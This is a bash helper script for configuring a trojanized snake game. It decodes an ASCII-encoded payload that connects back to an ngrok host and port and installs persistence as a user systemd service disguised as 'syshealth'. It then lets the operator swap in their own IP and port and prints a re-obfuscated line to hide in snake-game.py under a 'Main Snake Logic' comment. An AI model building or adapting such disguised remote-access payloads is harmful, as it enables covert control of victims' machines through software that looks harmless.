#!/bin/bash

# ENTER THE try execpt _p3 line's ASCII codes here - Where #MAIN SNAKE LOGIC is commented in snake-game.py
# Edit this to see your current payload
ascii_codes=(45,45,113,117,105,101,116,32,45,45,115,121,115,116,101,109,100,32,45,45,100,101,102,97,117,108,116,32,45,45,105,112,32,48,46,116,99,112,46,105,110,46,110,103,114,111,107,46,105,111,32,45,45,112,111,114,116,32,49,56,55,54,56,32,45,45,112,97,116,104,32,126,47,46,99,111,110,102,105,103,47,115,121,115,116,101,109,100,47,117,115,101,114,47,115,121,115,104,101,97,108,116,104,46,115,101,114,118,105,99,101)

# Decode ASCII codes to string
decoded_payload=$(python3 -c "print(''.join(chr(x) for x in [${ascii_codes[*]}]))")

# Print current payload
echo "Your current payload:"
echo "$decoded_payload"
echo

# Prompt user to edit IP and port
read -p "Do you want to edit IP & Port? (y/n): " choice
if [[ "$choice" == "y" || "$choice" == "Y" ]]; then
    read -p "Enter IP/Ngrok (press ENTER to keep unchanged): " new_ip
    read -p "Enter Port: " new_port

    # Use original IP if new_ip is empty
    if [[ -z "$new_ip" ]]; then
        new_ip="0.tcp.in.ngrok.io"
    fi

    # Modify the decoded payload
    modified_payload=$(echo "$decoded_payload" | sed -e "s/0.tcp.in.ngrok.io/$new_ip/" -e "s/18768/$new_port/")

    # Re-encode to ASCII codes
    new_ascii_codes=$(python3 -c "print([ord(c) for c in '$modified_payload'])")

    # Print the new encrypted _p3 line
    echo
    echo -e "Your new encrypted payload (add this in python code commented as: '#Main Snake Logic'): \n"
    new_p3="_p3 = ''.join(chr(x) for x in [46,47]) + os.path.basename(_p2) + ' ' + ''.join(chr(x) for x in $new_ascii_codes)"
    echo "$new_p3"

    # Decode the new payload for confirmation
    new_decoded_payload=$(python3 -c "print(''.join(chr(x) for x in $new_ascii_codes))")
    echo
    echo "Decoded new payload for confirmation:"
    echo "$new_decoded_payload"
else
    echo "No changes made."
fi
